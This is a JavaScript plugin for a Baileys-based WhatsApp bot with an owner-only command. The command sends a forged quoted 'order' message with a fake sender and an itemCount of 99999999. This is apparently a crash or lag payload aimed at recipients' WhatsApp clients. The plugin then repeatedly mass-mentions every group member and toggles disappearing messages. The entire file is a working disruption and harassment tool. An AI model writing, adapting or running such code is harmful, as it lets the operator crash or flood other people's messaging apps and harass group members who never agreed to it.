let { MessageType } = require('@adiwajshing/baileys')
let fs = require ('fs')
let handler  = async (m, { conn, text }) => {
  function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  if (text){
    conn.sendFile(m.chat, fs.readFileSync(`./media/images/bug.jpg`), 'error.jpg', '', {	
      key: {
        remoteJid: '0@s.whatsapp.net',
        fromMe: false,
      }, message: {
        orderMessage: {
          itemCount: 99999999,
          orderTitle: '',
          sellerJid: '0@s.whatsapp.net',
          jpegThumbnail: fs.readFileSync(`./media/images/bug.jpg`)
        }
      }
    })
  }

  let users = (await conn.groupMetadata(m.chat)).participants.map(u => u.jid)
  for (i=0;i<2;i++){
    conn.sendMessage(m.chat, `*halo kak*`,MessageType.extendedText,{ contextInfo: { mentionedJid: users } })
		await conn.toggleDisappearingMessages(m.chat, { quoted: m })
		await sleep(3000)
	}
}
handler.help = []
handler.tags = []
handler.customPrefix = /^[S]/
handler.command = /^(alkens)$/i
handler.owner = true
module.exports = handler